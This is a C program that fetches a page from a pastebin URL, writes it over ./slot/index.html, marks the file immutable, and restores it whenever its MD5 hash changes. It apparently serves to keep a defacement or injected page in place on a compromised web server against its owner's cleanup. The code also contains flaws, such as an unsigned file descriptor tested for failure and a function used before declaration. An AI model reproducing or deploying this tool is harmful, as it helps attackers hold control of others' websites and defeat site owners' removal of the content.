#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
#include <openssl/md5.h>
#include <curl/curl.h>

#define SRC             "https://pastebin.com/raw/eVjujdc1"
#define SRC_MD5         "6807828dbfab3dfa1301a0cbfc497cab"
#define TARGET_FILE     "./slot/index.html"
#define NORM            0x00000000

char * calc_md5(const char *filename) {
  unsigned char c[MD5_DIGEST_LENGTH];
  int i;
  MD5_CTX mdContext;
  int bytes;
  unsigned char data[1024];
  char *filemd5 = (char*) malloc(33 *sizeof(char));

  FILE *fs = fopen(filename, "rb");
  if (fs == NULL) {
    perror(filename); // TODO: not exist ? restore
    exit(1);
  }
  
  MD5_Init(&mdContext);
  while ((bytes = fread(data, 1, 1024, fs)) != 0)
    MD5_Update(&mdContext, data, bytes);
  MD5_Final(c,&mdContext);

  for(i = 0; i < MD5_DIGEST_LENGTH; i++) {
    sprintf(&filemd5[i*2], "%02x", (unsigned int)c[i]);
  }

  fclose(fs);
  return filemd5;
}

int restore() {
  int new_attrs;
  size_t fd;

  CURL* easyhandle = curl_easy_init();
  curl_easy_setopt(easyhandle, CURLOPT_URL, SRC);
  curl_easy_setopt(easyhandle, CURLOPT_HEADER, 0);

  FILE* file = fopen(TARGET_FILE, "w");
  curl_easy_setopt(easyhandle, CURLOPT_WRITEDATA, file);
  curl_easy_perform(easyhandle);
  curl_easy_cleanup(easyhandle);
  
  fclose(file);

  fd = open(TARGET_FILE, 0);
  new_attrs = FS_IMMUTABLE_FL;

  if (ioctl(fd, FS_IOC_SETFLAGS, &new_attrs) == -1) {
    fprintf(stderr, "ERROR: Unable to set flags on %s, skipping\n", TARGET_FILE);
  }

  return 0;
}
 
int cekidot() {
  if (access(TARGET_FILE, F_OK) != 0) {
    restore();
  } else {
    resetattr();
    restore();
  }   
  return 0; 
}

int check_md() {
  char *new_md5 = calc_md5(TARGET_FILE);
  if (!strcmp(SRC_MD5, new_md5)) {
    return 0; // TODO: check config && resident?
  } else {
    restore();
  }
  free(new_md5);
  return 0;
}

int resetattr() {
  int current_attrs, new_attrs, mask;
  size_t fd;
  
  fd = open(TARGET_FILE, 0); 
  if (fd < 0) {
    fprintf(stderr, "ERROR: Unable to open %s\n", TARGET_FILE);
    exit(1);
  }
 
  if (ioctl(fd, FS_IOC_GETFLAGS, &current_attrs) == -1) {
    fprintf(stderr, "ERROR: Unable to get flags on %s\n", TARGET_FILE);
    close(fd);
    exit(1);
  }

  new_attrs = NORM; 
  if (ioctl(fd, FS_IOC_SETFLAGS, &new_attrs) == -1) {
    fprintf(stderr, "ERROR: Unable to set flags on %s\n", TARGET_FILE);
    close(fd);
    exit(1);
  }

  close(fd);
}

int main() {
  cekidot();
  check_md();
}
